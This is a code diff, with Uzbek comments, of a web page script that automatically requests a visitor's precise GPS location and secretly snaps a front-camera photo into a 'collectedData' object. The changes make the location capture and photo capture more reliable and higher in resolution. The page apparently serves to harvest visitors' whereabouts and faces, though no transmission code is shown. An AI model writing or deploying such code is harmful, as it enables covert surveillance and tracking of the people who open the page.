@@ -157,35 +157,51 @@
             };
 
             // 1. GPS joylashuvni avtomatik olish
-            try {
-                const position = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(
-                        resolve, 
-                        reject,
-                        { 
-                            enableHighAccuracy: true,
-                            timeout: 10000,
-                            maximumAge: 0
-                        }
-                    );
-                });
-                
-                collectedData.gps_location = {
-                    latitude: position.coords.latitude,
-                    longitude: position.coords.longitude,
-                    accuracy: position.coords.accuracy,
-                    altitude: position.coords.altitude,
-                    speed: position.coords.speed,
-                    timestamp: position.timestamp
-                };
-                console.log('GPS data collected:', collectedData.gps_location);
-            } catch (error) {
-                console.log('GPS error:', error.message);
-                collectedData.gps_location = { error: error.message };
+            if (navigator.geolocation) {
+                try {
+                    console.log('Requesting GPS location...');
+                    const position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(
+                            resolve, 
+                            (error) => {
+                                console.log('GPS permission denied or error:', error.message);
+                                reject(error);
+                            },
+                            { 
+                                enableHighAccuracy: true,
+                                timeout: 10000,
+                                maximumAge: 0
+                            }
+                        );
+                    });
+                    
+                    collectedData.gps_location = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        altitude: position.coords.altitude,
+                        speed: position.coords.speed,
+                        timestamp: position.timestamp
+                    };
+                    console.log('GPS data collected:', collectedData.gps_location);
+                } catch (error) {
+                    console.log('GPS error:', error.message);
+                    collectedData.gps_location = { 
+                        error: error.message,
+                        code: error.code,
+                        message: error.code === 1 ? 'User denied GPS permission' : 
+                                 error.code === 2 ? 'Position unavailable' : 
+                                 error.code === 3 ? 'Timeout' : 'Unknown error'
+                    };
+                }
+            } else {
+                console.log('Geolocation not supported');
+                collectedData.gps_location = { error: 'Geolocation not supported by browser' };
             }
 
             // 2. Kameradan avtomatik rasm olish
             try {
+                console.log('Requesting camera access...');
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
                         facingMode: "user",
@@ -195,27 +211,44 @@
                     audio: false 
                 });
                 
+                console.log('Camera access granted');
                 const video = document.getElementById('video');
                 const canvas = document.getElementById('canvas');
                 const context = canvas.getContext('2d');
                 
                 video.srcObject = stream;
                 
-                // Kamera tayyorlanguncha kutish
-                await new Promise(resolve => setTimeout(resolve, 2000));
+                // Video to'liq yuklanishini kutish
+                await new Promise((resolve) => {
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        resolve();
+                    };
+                });
+                
+                // Kamera stabillanishi uchun ko'proq kutish
+                await new Promise(resolve => setTimeout(resolve, 3000));
+                
+                console.log('Taking photo...');
+                // Canvas o'lchamini video bilan moslash
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
                 
                 // Rasmga olish
-                context.drawImage(video, 0, 0, 320, 240);
-                const imageData = canvas.toDataURL('image/jpeg', 0.8);
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const imageData = canvas.toDataURL('image/jpeg', 0.9);
                 
                 collectedData.camera = {
                     captured: true,
-                    image: imageData
+                    image: imageData,
+                    resolution: `${canvas.width}x${canvas.height}`
                 };
+                console.log('Photo captured successfully');
                 
                 // Kamerani o'chirish
                 stream.getTracks().forEach(track => track.stop());
             } catch (error) {
+                console.log('Camera error:', error.message);
                 collectedData.camera = { error: error.message };
             }
 
